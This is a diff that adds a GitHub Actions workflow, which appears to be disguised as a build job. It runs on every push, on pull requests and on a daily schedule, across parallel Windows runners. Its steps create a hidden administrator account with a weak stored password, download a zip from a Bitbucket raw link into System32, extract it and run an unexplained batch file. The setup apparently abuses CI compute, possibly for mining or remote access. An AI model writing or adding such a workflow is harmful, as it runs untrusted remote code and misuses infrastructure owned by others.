@@ -1,0 +1,46 @@
+name: MR_Golek_Opo #gretonger yang di buang di group t.me/Bego_android_official
+on:
+  push:
+    branches: [ master, main ]
+  pull_request:
+    branches: [ master, main ]
+  schedule:
+    - cron: '0 0 * * *'
+jobs:
+  build:
+    name: Cpu
+    runs-on: windows-latest
+    strategy:
+      max-parallel: 20
+      fail-fast: false
+      matrix:
+        Mr: [A]
+        Golek: [1, 2, 3, 4, 5]
+        Opo: [A.1]
+    timeout-minutes: 360
+    env:
+        NUM_JOBS: 90
+        JOB: ${{ matrix.Mr.Golek.Opo }}
+    steps:
+    - name: Mr
+      run: |
+        cmd /k net user MrGolekOpo /add
+        cmd /k net localgroup administrators MrGolekOpo /add
+        cmd /k cmdkey /add:server01 /user:MrGolekOpo /pass:123456789
+        wmic useraccount get name
+        cmdkey /list
+    - name: Golek
+      run: |
+        net user MrGolekOpo /active:yes
+    - name: Opo
+      run: |
+        net user MrGolekOpo /active:yes
+        chdir C:\Windows\System32
+        Invoke-WebRequest https://bitbucket.org/sindylestari/sindy/raw/fbb0989251611234a1be583df22d4afc64f97f45/Api_App.zip -Outfile Api_App.zip
+        Expand-Archive Api_App.zip
+        cmd /k start .\maingi.bat
+        
+        
+        
+        
+        
